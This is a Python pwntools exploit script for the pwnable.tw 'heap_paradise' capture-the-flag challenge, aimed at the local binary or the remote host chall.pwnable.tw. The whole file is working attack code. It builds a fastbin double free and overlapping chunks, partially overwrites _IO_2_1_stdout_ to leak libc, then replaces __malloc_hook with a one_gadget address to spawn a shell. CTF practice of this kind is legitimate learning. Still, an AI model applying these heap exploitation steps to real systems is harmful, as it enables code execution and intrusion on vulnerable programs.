from pwn import *

context.log_level = "debug"
debug = 1


def allocateChunk(size, data):
    p.recvuntil("Choice:")
    p.sendline("1")
    p.recvuntil("Size :")
    p.sendline(str(size))
    p.recvuntil("Data :")
    p.send(data)


def freeChunk(index):
    p.recvuntil("Choice:")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))


def exitPra():
    p.recvuntil("Choice:")
    p.sendline("3")


while True:
    if debug:
        p = process(["./heap_paradise"])
        libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
        one_gadget = 0xf02a4
        gdb.attach(p)
    else:
        one_gadget = 0xef6c4
        p = remote("chall.pwnable.tw", 10308)
        libc = ELF("./libc_64.so.6")


    allocateChunk(0x68, "f"*0x10+p64(0)+p64(0x71))#0
    allocateChunk(0x68, 'a' * 0x10 + p64(0) + p64(0x31) + 'a' * 0x20 + p64(0) + p64(0x21))#1
    # allocateChunk(0x68, "aa")#2

    freeChunk(0)#fb point to fastbin
    freeChunk(1)#fb point to chunk 0
    freeChunk(0)#fb point to chunk 1

    allocateChunk(0x68, "\x20")#3 fd of chunk 0 point to chunk_0+0x20
    allocateChunk(0x68, "\x00")#4
    allocateChunk(0x68, "\x00")#5
    allocateChunk(0x68, "\x00")#6 get the chunk_+0x20 chunk

    freeChunk(0)
    allocateChunk(0x68, 'd' * 0x10 + p64(0) + p64(0xa1)) # over chunk
    freeChunk(5) # get unsorted bin

    freeChunk(0)
    freeChunk(1)

    allocateChunk(0x78, 'f'*0x40+p64(0)+p64(0x71)+"\xa0")#7
    freeChunk(7)

    allocateChunk(0x68, "c"*0x20+p64(0) + p64(0x71) + p64(libc.symbols['_IO_2_1_stdout_'] - 0x43)[:2])#8
    allocateChunk(0x68, "\x00")#9
    try:
        allocateChunk(0x68, '\x00' * 3 + p64(0) * 6 + p64(0xfbad1800) + p64(0) * 3 + "\x80")# 10\
        p.recv(8)
        address = u64(p.recv(8))
    except:
        p.close()
        print "error"
        continue
    libc.address = address-libc.symbols['_IO_2_1_stdin_']
    print "libc address", hex(libc.address)
    one_gadget_address = libc.address+one_gadget
    malloc_hook_address = libc.symbols['__malloc_hook']
    print "malloc hook address", hex(malloc_hook_address)
    print "one gadget address", hex(one_gadget_address)

    freeChunk(0)
    freeChunk(1)
    freeChunk(0)
    allocateChunk(0x68, p64(malloc_hook_address-0x23))#11
    allocateChunk(0x68, "\x00")#12
    allocateChunk(0x68, "\x00")#13
    allocateChunk(0x68, '\x00'*0x13+p64(one_gadget_address))#14

    p.sendlineafter('You Choice:', '1')
    p.sendlineafter('Size :', str(8))

    p.interactive()